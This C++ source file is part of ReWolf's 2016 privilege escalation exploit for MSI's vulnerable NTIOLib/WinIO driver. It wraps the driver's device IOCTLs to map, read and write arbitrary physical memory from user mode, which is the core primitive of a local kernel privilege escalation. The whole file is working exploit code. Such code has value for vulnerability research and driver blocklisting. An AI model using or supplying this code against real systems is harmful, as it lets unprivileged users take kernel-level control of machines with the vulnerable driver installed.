/**
*
* MSI NTIOLib/WinIO privilege escalation exploit
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1630
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include "WinIO.h"

WinIO::WinIO()
{
	hDevice = CreateFileA("\\\\.\\WINIO", 0xC0000000, 0, 0, 3u, 0x80u, 0);
}

WinIO::~WinIO()
{
	if (INVALID_HANDLE_VALUE != hDevice)
		CloseHandle(hDevice);
}

uint8_t* WinIO::mapPhysicalMemory(uint64_t physAddr, size_t size, winioMem& mem)
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		memset(&mem, 0, sizeof(winioMem));
		mem.addr = physAddr;
		mem.size = size;
		DWORD retSize;
		BOOL r = DeviceIoControl(hDevice, 0x80102040, &mem, sizeof(winioMem), &mem, sizeof(winioMem), &retSize, 0);
		if (r)
			return (uint8_t*)mem.outPtr;
	}
	return nullptr;
}

void WinIO::unmapPhysicalMemory(winioMem& mem)
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		DWORD retSize;
		DeviceIoControl(hDevice, 0x80102044, &mem, sizeof(winioMem), 0, 0, &retSize, 0);
	}
}

bool WinIO::readPhysicalMemory(uint64_t physAddress, uint8_t* buffer, size_t size)
{
	if (INVALID_HANDLE_VALUE != hDevice)
	{
		winioMem mem;
		uint8_t* tmp = mapPhysicalMemory(physAddress, size, mem);
		if (nullptr != tmp)
		{
			memcpy(buffer, tmp, size);
			unmapPhysicalMemory(mem);
		}
	}
	return false;
}

MemoryWinIO::MemoryWinIO()
{
	memset(&m_IMemoryHelper, 0, sizeof(m_IMemoryHelper));
}

uint8_t* MemoryWinIO::getMemory(uint64_t physAddr, size_t size)
{
	reset();
	return m_WinIo.mapPhysicalMemory(physAddr, size, m_IMemoryHelper);
}

void MemoryWinIO::commitMemory()
{
	if (0 != m_IMemoryHelper.outPtr)
	{
		m_WinIo.unmapPhysicalMemory(m_IMemoryHelper);
		memset(&m_IMemoryHelper, 0, sizeof(m_IMemoryHelper));
	}
}

void MemoryWinIO::reset()
{
	commitMemory();
}

uint64_t MemoryWinIO::getPhysicalAddress()
{
	return m_IMemoryHelper.addr;
}

void MemoryWinIO::commitValue(size_t offsetInBuf, uint64_t value)
{
	commitValue<uint64_t>(offsetInBuf, value);
}

template <class T>
void MemoryWinIO::commitValue(size_t offsetInBuf, T value)
{
	*(T*)(m_IMemoryHelper.outPtr + offsetInBuf) = value;
	commitMemory();
}
